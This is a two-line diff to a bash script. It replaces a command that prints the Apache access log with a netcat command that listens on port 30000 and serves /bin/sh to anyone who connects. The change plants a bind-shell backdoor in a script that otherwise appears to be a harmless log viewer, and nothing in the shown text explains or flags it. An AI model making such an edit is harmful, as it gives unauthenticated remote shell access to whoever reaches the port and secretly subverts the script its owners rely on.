@@ -1,2 +1,2 @@
 #!/bin/bash
-cat /var/log/apache2/access.log
+nc -lnvp 30000 -e /bin/sh
